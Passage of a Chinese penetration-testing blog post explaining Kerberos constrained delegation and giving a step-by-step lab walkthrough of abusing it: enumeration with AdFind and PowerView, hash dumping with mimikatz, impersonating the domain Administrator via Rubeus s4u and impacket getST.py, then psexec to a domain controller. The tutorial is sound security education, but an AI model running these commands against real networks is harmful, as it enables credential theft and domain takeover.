<p>约束委派在Kerberos中User不会直接发送TGT 给 service1，而是对发送给service1的认证信息做了限制，不允许service1代表User使用这个TGT去访问其他服务。</p>
<p><code>S4U2Self</code>和<code>S4U2proxy</code>的请求过程：</p>
<p><img src="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/ms-sfu_files/image002.png"></p>
<p><code>S4U2self</code>：service1代表用户请求针对其自身的服务票据ST1；<br><code>S4U2proxy</code>：service1用<code>S4U2self</code>阶段的可转发ST1代表用户请求service2的票据，这个过程会检查<code>msdn-allowedtodelegateto</code>的SPN值来确定是否可以申请到服务的票据。</p>
<p>约束委派就是限制了<code>S4U2proxy</code>扩展的范围，只能模拟该用户访问特定的服务</p>
<p>以下表示委派此计算机可以访问DC的CIFS服务</p>
<p>  <img src="https://blog-1300147235.cos.ap-chengdu.myqcloud.com/202303121455978.png"></p>
<p><strong>查找约束委派的主机或服务</strong><br>adfind</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">查找域中配置约束委派用户</span></span><br><span class="line">AdFind.exe -b &quot;DC=hackme,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">查找域中配置约束委派的主机</span></span><br><span class="line">AdFind.exe -b &quot;DC=hackme,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>
<p>empire中的 powerview</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">导入powershell模块</span></span><br><span class="line">load powershell</span><br><span class="line"><span class="meta"># </span><span class="language-bash">导入</span></span><br><span class="line">powershell_import powerwiew.ps1</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">PowerView查询约束委派机器账户</span></span><br><span class="line">powershell_shell</span><br><span class="line"><span class="meta">&gt; </span><span class="language-bash">Get-DomainComputer -TrustedToAuth -Domain xiaorang.lab</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">PowerView查询约束委派服务账户</span></span><br><span class="line"><span class="meta">&gt; </span><span class="language-bash">Get-DomainUser –TrustedToAuth -domain xiaorang.lab -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|fl</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>约束委派的利用——使用Rubeus</strong></p>
<p>1、使用mimikatz获取机器账户的NTLM hash值</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
<p>2、使用Rubeus申请访问自身的可转发服务票据</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">使用Rubeus申请配置了约束委派机器账户WIN10-1$的TGT</span></span><br><span class="line">Rubeus.exe asktgt /user:win10$ /rc4:a5ff267c99a19db78f0e7ac22c1ce576 /domain:hackme.com /dc:dc.hackme.com /nowrap</span><br></pre></td></tr></table></figure>
<p>3、使用Rubeus通过S4U2Self协议代表域管理员Administrator请求针对域控LDAP服务的票据，并注入内存</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/dc.hackme.com /dc:dc.hackme.com /ptt /ticket:doIEyjCC...WUuY29t</span><br></pre></td></tr></table></figure>
<p>4、<code>dir \\DC.hackme.com\c$</code></p>
<p><strong>约束委派的利用——使用impacket项目</strong><br>1、mimikatz获取机器账户NTLM Hash值<br>2、使用getST.py申请服务票据</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python getST.py -dc-ip 192.168.88.10 -spn CIFS/DC.hackme.com -impersonate administrator hackme.com/WIN10$ -hashes :a5ff267c99a19db78f0e7ac22c1ce576</span><br></pre></td></tr></table></figure>
<p>3、使用票据远程访问，获取</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache</span><br><span class="line">python3 psexec.py -k hackme.com/administrator@DC.hackme.com -no-pass -dc-ip 192.168.88.10</span><br></pre></td></tr></table></figure>


<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/273725.html">https://www.freebuf.com/articles/network/273725.html</a><br><a target="_blank" rel="noopener" href="https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/">https://seevae.github.io/2020/09/12/详解kerberos认证流程/</a><br><a target="_blank" rel="noopener" href="https://evilh2o2.github.io/2019/08/25/Windows%E5%9F%9F%E8%AE%A4%E8%AF%81%E4%BD%93%E7%B3%BB%E2%80%94Kerberos%E8%AE%A4%E8%AF%81/">https://evilh2o2.github.io/2019/08/25/Windows域认证体系—Kerberos认证/</a></p>
<h2 id="鸣谢"><a href="#鸣谢" class="headerlink" title="鸣谢"></a>鸣谢</h2><p>感谢我的小兔兔@<a target="_blank" rel="noopener" href="https://gryffinbit.top/">兔子</a>一直陪在我身边，要一直一直爱你！</p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Dar1in9</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://dar1in9s.github.io/2023/04/06/内网渗透/Kerberos/">http://dar1in9s.github.io/2023/04/06/内网渗透/Kerberos/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://Dar1in9s.github.io">Dar1in9's Blog</a>！</span></div></div><div class="post-meta__tag-list"></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2023/04/07/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/NTLM/"><i class="fa fa-chevron-left">  </i><span>内网渗透之NTLM</span></a></div><div class="next-post pull-right"><a href="/2023/04/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"><span>内网渗透之横向移动</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://blog-1300147235.cos.ap-chengdu.myqcloud.com/Background2.png)"><div class="layout" id="footer"><div class="copyright">&copy;2020 - 2023 By Dar1in9</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script src="/js/search/algolia.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><div class="search-dialog" id="algolia-search"><div class="search-dialog__title" id="algolia-search-title">Algolia</div><div id="algolia-input-panel"><div id="algolia-search-input"></div></div><hr><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-stats"></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>